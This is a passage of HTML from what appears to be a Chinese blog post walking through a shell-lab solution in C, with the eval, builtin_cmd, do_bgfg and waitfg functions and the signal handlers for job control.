class="hljs-built_in">strchr</span>(buf, <span class="hljs-string">&#x27; &#x27;</span>); <span class="hljs-comment">//这两个delim指明的是当前参数后面的分隔符</span><br>    &#125;<br><br>    <span class="hljs-keyword">while</span> (delim) &#123;<br>argv[argc++] = buf;<br>*delim = <span class="hljs-string">&#x27;\0&#x27;</span>;<span class="hljs-comment">//截断</span><br>buf = delim + <span class="hljs-number">1</span>;<br><span class="hljs-keyword">while</span> (*buf &amp;&amp; (*buf == <span class="hljs-string">&#x27; &#x27;</span>)) <span class="hljs-comment">/* ignore spaces */</span><br>       buf++;<br><br><span class="hljs-keyword">if</span> (*buf == <span class="hljs-string">&#x27;\&#x27;&#x27;</span>) &#123;<br>    buf++;<br>    delim = <span class="hljs-built_in">strchr</span>(buf, <span class="hljs-string">&#x27;\&#x27;&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br>    delim = <span class="hljs-built_in">strchr</span>(buf, <span class="hljs-string">&#x27; &#x27;</span>);<br>&#125;<br>    &#125;<br>    argv[argc] = <span class="hljs-literal">NULL</span>;<br>    <br>    <span class="hljs-keyword">if</span> (argc == <span class="hljs-number">0</span>)  <span class="hljs-comment">/* ignore blank line */</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br><br>    <span class="hljs-comment">/* should the job run in the background? */</span><br>    <span class="hljs-keyword">if</span> ((bg = (*argv[argc<span class="hljs-number">-1</span>] == <span class="hljs-string">&#x27;&amp;&#x27;</span>)) != <span class="hljs-number">0</span>) &#123;<br>argv[--argc] = <span class="hljs-literal">NULL</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> bg;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="1-eval-处理命令行输入-cmdline"><a href="#1-eval-处理命令行输入-cmdline" class="headerlink" title="1.eval(): 处理命令行输入(cmdline)"></a>1.<code>eval()</code>: 处理命令行输入(cmdline)</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * eval - Evaluate the command line that the user has just typed in</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * If the user has requested a built-in command (quit, jobs, bg or fg)</span><br><span class="hljs-comment"> * then execute it immediately. Otherwise, fork a child process and</span><br><span class="hljs-comment"> * run the job in the context of the child. If the job is running in</span><br><span class="hljs-comment"> * the foreground, wait for it to terminate and then return.  Note:</span><br><span class="hljs-comment"> * each child process must have a unique process group ID so that our</span><br><span class="hljs-comment"> * background children don&#x27;t receive SIGINT (SIGTSTP) from the kernel</span><br><span class="hljs-comment"> * when we type ctrl-c (ctrl-z) at the keyboard.  </span><br><span class="hljs-comment">*/</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">eval</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *cmdline)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">sigset_t</span> <span class="hljs-built_in">set</span>;<br>    <span class="hljs-keyword">pid_t</span> pid;<br>    <span class="hljs-keyword">int</span> state = UNDEF;<br>    <span class="hljs-keyword">char</span> *argv[MAXLINE];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-number">1</span> == parseline(cmdline, argv))<br>        state = BG;<br>    <span class="hljs-keyword">else</span><br>        state = FG;<br>    <span class="hljs-keyword">if</span> (argv[<span class="hljs-number">0</span>] == <span class="hljs-literal">NULL</span>)<br>        <span class="hljs-keyword">return</span>;<br>    <span class="hljs-keyword">if</span> (!builtin_cmd(argv))<br>    &#123;<br>        sigemptyset(&amp;<span class="hljs-built_in">set</span>);<br>        sigaddset(&amp;<span class="hljs-built_in">set</span>, SIGINT), sigaddset(&amp;<span class="hljs-built_in">set</span>, SIGCHLD), sigaddset(&amp;<span class="hljs-built_in">set</span>, SIGSTOP);<br>        sigprocmask(SIG_BLOCK, &amp;<span class="hljs-built_in">set</span>, <span class="hljs-literal">NULL</span>);<br><br>        <span class="hljs-keyword">if</span> ((pid = fork()) &lt; <span class="hljs-number">0</span>)<br>            unix_error(<span class="hljs-string">&quot;fork error!&quot;</span>);<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (pid == <span class="hljs-number">0</span>) <span class="hljs-comment">//进入到了fork出来的子程序</span><br>        &#123;<br>            sigprocmask(SIG_UNBLOCK, &amp;<span class="hljs-built_in">set</span>, <span class="hljs-literal">NULL</span>);<br>            setpgid(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>            <span class="hljs-keyword">if</span> (execve(argv[<span class="hljs-number">0</span>], argv, environ) &lt; <span class="hljs-number">0</span>) <span class="hljs-comment">//1.路径 2.参数（包括1） 3.环境变量</span><br>            &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s: commond not found!&quot;</span>, argv[<span class="hljs-number">0</span>]);<br>                <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-comment">//fork完成， 加入joblist</span><br>        addjob(jobs, pid, state, cmdline);<br>        <span class="hljs-keyword">if</span> (sigprocmask(SIG_UNBLOCK, &amp;<span class="hljs-built_in">set</span>, <span class="hljs-literal">NULL</span>) &lt; <span class="hljs-number">0</span>)<br>            unix_error(<span class="hljs-string">&quot;sigprocmask error&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> (state == FG)<br>            waitfg(pid);<br>        <span class="hljs-keyword">else</span><br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[%d] (%d) %s&quot;</span>, pid2jid(pid), pid, cmdline);<br>    &#125;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="2-builtin-cmd-判断是否内置函数并跳转"><a href="#2-builtin-cmd-判断是否内置函数并跳转" class="headerlink" title="2.builtin_cmd()判断是否内置函数并跳转"></a>2.<code>builtin_cmd()</code>判断是否内置函数并跳转</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * builtin_cmd - If the user has typed a built-in command then execute</span><br><span class="hljs-comment"> *    it immediately.  </span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">builtin_cmd</span><span class="hljs-params">(<span class="hljs-keyword">char</span> **argv)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(argv[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;quit&quot;</span>))<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(argv[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;bg&quot;</span>) || !<span class="hljs-built_in">strcmp</span>(argv[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;fg&quot;</span>))<br>        do_bgfg(argv);<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(argv[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;jobs&quot;</span>))<br>        listjobs(jobs);<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <span class="hljs-comment">/* not a builtin command */</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="3-do-bgfg-执行bg-fg命令"><a href="#3-do-bgfg-执行bg-fg命令" class="headerlink" title="3.do_bgfg()执行bg fg命令"></a>3.<code>do_bgfg()</code>执行bg fg命令</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * do_bgfg - Execute the builtin bg and fg commands</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">do_bgfg</span><span class="hljs-params">(<span class="hljs-keyword">char</span> **argv)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> parsed;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">job_t</span> *<span class="hljs-title">job</span>;</span><br>    <span class="hljs-keyword">if</span> (!argv[<span class="hljs-number">1</span>])<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s commond requires PID or %%JID argument\n&quot;</span>, argv[<span class="hljs-number">0</span>]);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (argv[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;%&#x27;</span>) <span class="hljs-comment">//错误检查以及取出PID或者JID</span><br>    &#123;<br>        <span class="hljs-keyword">if</span> ((parsed = strtol(argv[<span class="hljs-number">1</span>] + <span class="hljs-number">1</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">10</span>)) &lt;= <span class="hljs-number">0</span>)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s: arguments must be a PID or JID\n&quot;</span>, argv[<span class="hljs-number">0</span>]);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> ((job = getjobjid(jobs, parsed)) == <span class="hljs-literal">NULL</span>)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;(%d): No such job\n&quot;</span>, parsed);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-keyword">if</span> ((parsed = strtol(argv[<span class="hljs-number">1</span>], <span class="hljs-literal">NULL</span>, <span class="hljs-number">10</span>)) &lt;= <span class="hljs-number">0</span>)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s: arguments must be a PID or JID\n&quot;</span>, argv[<span class="hljs-number">0</span>]);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> ((job = getjobpid(jobs, parsed)) == <span class="hljs-literal">NULL</span>)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;(%d): No such process\n&quot;</span>, parsed);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">//fg和bg分别处理</span><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(argv[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;bg&quot;</span>))<br>    &#123;<br>        job-&gt;state = BG;<br>        <span class="hljs-keyword">if</span> (kill(-(job-&gt;pid), SIGCONT) &lt; <span class="hljs-number">0</span>)<span class="hljs-comment">//发送signal到groupid为|job-&gt;pid|的组</span><br>            unix_error(<span class="hljs-string">&quot;kill error&quot;</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[%d] (%d) %s&quot;</span>, job-&gt;jid, job-&gt;pid, job-&gt;cmdline);<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(argv[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;fg&quot;</span>))<br>    &#123;<br>        job-&gt;state = FG;<br>        <span class="hljs-keyword">if</span> (kill(-(job-&gt;pid), SIGCONT) &lt; <span class="hljs-number">0</span>)<br>            unix_error(<span class="hljs-string">&quot;kill error&quot;</span>);<br>        waitfg(job-&gt;pid);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;do_bgfg: Internal error&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="4-waitfg-等待前台程序结束"><a href="#4-waitfg-等待前台程序结束" class="headerlink" title="4.waitfg()等待前台程序结束"></a>4.<code>waitfg()</code>等待前台程序结束</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">waitfg</span><span class="hljs-params">(<span class="hljs-keyword">pid_t</span> pid)</span></span><br><span class="hljs-function"></span>&#123;<span class="hljs-comment">//使用sigsuspend</span><br>    <span class="hljs-keyword">sigset_t</span> sig, prev;<br>    sigemptyset(&amp;sig);<br>    sigaddset(&amp;sig, SIGCHLD);<br>    sigprocmask(SIG_BLOCK, &amp;sig, &amp;prev);<br>    <br>    <span class="hljs-keyword">while</span>(pid == fgpid(jobs))<br>        sigsuspend(&amp;prev);<br>    <br>    sigprocmask(SIG_SETMASK, &amp;prev, <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-keyword">if</span>(verbose)<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;waitfg: Process (%d) no longer the fg process\n&quot;</span>, pid);<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="5-signal-handlers"><a href="#5-signal-handlers" class="headerlink" title="5.signal_handlers"></a>5.<code>signal_handlers</code></h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*****************</span><br><span class="hljs-comment"> * Signal handlers</span><br><span class="hljs-comment"> *****************/</span><br><br><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * sigchld_handler - The kernel sends a SIGCHLD to the shell whenever</span><br><span class="hljs-comment"> *     a child job terminates (becomes a zombie), or stops because it</span><br><span class="hljs-comment"> *     received a SIGSTOP or SIGTSTP signal. The handler reaps all</span><br><span class="hljs-comment"> *     available zombie children, but doesn&#x27;t wait for any other</span><br><span class="hljs-comment"> *     currently running children to terminate.  </span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">sigchld_handler</span><span class="hljs-params">(<span class="hljs-keyword">int</span> sig)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">pid_t</span> pid;<br>    <span class="hljs-keyword">int</span> status;<br>    <span class="hljs-keyword">while</span> ((pid = waitpid(<span class="hljs-number">-1</span>, &amp;status, WNOHANG | WUNTRACED)) &gt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (WIFEXITED(status))<br>        &#123; <span class="hljs-comment">/*process is exited in normal way*/</span><br>            deletejob(jobs, pid);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (WIFSIGNALED(status))<br>        &#123; <span class="hljs-comment">/*process is terminated by a signal*/</span><br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Job [%d] (%d) terminated by signal %d\n&quot;</span>, pid2jid(pid), pid, WTERMSIG(status));<br>            deletejob(jobs, pid);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (WIFSTOPPED(status))<br>        &#123; <span class="hljs-comment">/*process is stop because of a signal*/</span><br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Job [%d] (%d) stopped by signal %d\n&quot;</span>, pid2jid(pid), pid, WSTOPSIG(status));<br>            <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">job_t</span> *<span class="hljs-title">job</span> =</span> getjobpid(jobs, pid);<br>            <span class="hljs-keyword">if</span> (job != <span class="hljs-literal">NULL</span>)<br>                job-&gt;state = ST;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * sigint_handler - The kernel sends a SIGINT to the shell whenver the</span><br><span class="hljs-comment"> *    user types ctrl-c at the keyboard.  Catch it and send it along</span><br><span class="hljs-comment"> *    to the foreground job.  </span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">sigint_handler</span><span class="hljs-params">(<span class="hljs-keyword">int</span> sig)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">pid_t</span> pid = fgpid(jobs);<br><br>    <span class="hljs-keyword">if</span> (pid != <span class="hljs-number">0</span>)<br>    &#123;<br>        kill(-pid, SIGINT);<br>    &#125;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * sigtstp_handler - The kernel sends a SIGTSTP to the shell whenever</span><br><span class="hljs-comment"> *     the user types ctrl-z at the keyboard. Catch it and suspend the</span><br><span class="hljs-comment"> *     foreground job by sending it a SIGTSTP.  </span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">sigtstp_handler</span><span class="hljs-params">(<span class="hljs-keyword">int</span> sig)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">pid_t</span> pid = fgpid(jobs);<br><br>    <span class="hljs-keyword">if</span> (pid != <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">job_t</span> *<span class="hljs-title">job</span> =</span> getjobpid(jobs, pid);<br>        <span class="hljs-keyword">if</span> (job-&gt;state == ST)<br>            <span class="hljs-keyword">return</span>;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            kill(-pid, SIGTSTP);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="其余代码"><a href="#其余代码" class="headerlink" title="其余代码"></a>其余代码</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span 